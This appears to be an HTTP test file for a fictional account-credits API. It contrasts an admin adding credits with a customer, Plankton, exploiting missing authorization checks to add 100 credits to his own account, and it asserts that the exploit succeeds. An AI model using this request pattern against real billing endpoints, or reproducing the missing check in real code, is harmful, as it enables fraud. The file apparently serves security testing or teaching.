# @import ../common/setup.http
@base = {{base_host}}/v202

# --- Legitimate Usage: Sandy can add credits to users using the Platform Admin API key ---

### Sandy adds credits to Spongebob's account
POST {{base}}/account/credits
X-Admin-API-Key: {{admin_key}}
Content-Type: application/x-www-form-urlencoded

user=spongebob@bikinibottom.sea&amount=100

?? status == 200
?? js response.parsedBody.balance == 120.00

# --- Exploit: Plankton can add credits to his own account ---
### Plankton checks his current balance
GET {{base}}/account/credits
Authorization: {{plankton_auth}}

### Plankton can add credits as customer
# @initial_balance
GET {{base}}/account/credits
Authorization: {{plankton_auth}}
Content-Type: application/x-www-form-urlencoded

amount=100&user=plankton@chum-bucket.sea

?? status == 200
?? js parseFloat(response.parsedBody.balance) == 200.00
